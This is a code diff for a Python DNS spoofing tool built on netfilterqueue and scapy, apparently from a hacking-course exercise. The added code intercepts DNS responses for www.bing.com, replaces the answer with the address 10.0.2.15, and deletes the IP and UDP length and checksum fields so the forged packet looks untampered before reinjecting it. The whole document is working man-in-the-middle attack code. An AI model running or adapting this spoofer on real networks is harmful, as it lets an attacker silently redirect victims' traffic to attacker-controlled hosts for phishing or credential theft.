@@ -15,6 +15,10 @@ from subprocess import call
 import netfilterqueue
 import scapy.all as scapy
 
+
+SPOOF_WEBSITE = b'www.bing.com'
+SPOOF_RDATA = b'10.0.2.15'
+
 ############################### Functions ############################### 
 def forward_packets():
     '''
@@ -56,7 +60,23 @@ def process_packet(packet):
     # Check for DNS layer in DNS Request Record (DNSRR) or 
     # DNS Question Record (DNSQR)
     if scapy_pkt.haslayer(scapy.DNSRR):
-        print(scapy_pkt.show())
+        qname = scapy_pkt[scapy.DNSQR].qname
+        if SPOOF_WEBSITE in qname:
+            print('[*] Spoofing target ...')
+            response = scapy.DNSRR(rrname=qname, rdata=SPOOF_RDATA)
+            scapy_pkt[scapy.DNS].an = response
+            scapy_pkt[scapy.DNS].ancount = 1
+
+            # remove IP.len,IP.chksum,UDP.len,UDP.chksum to make
+            # sure that our packet looks untampered and scapy will
+            # calculate it again for us.
+            del scapy_pkt[scapy.IP].len
+            del scapy_pkt[scapy.IP].chksum
+            del scapy_pkt[scapy.UDP].len
+            del scapy_pkt[scapy.UDP].chksum
+
+            packet.set_payload(bytes(scapy_pkt))
+            print(packet)
 
     packet.accept()
     
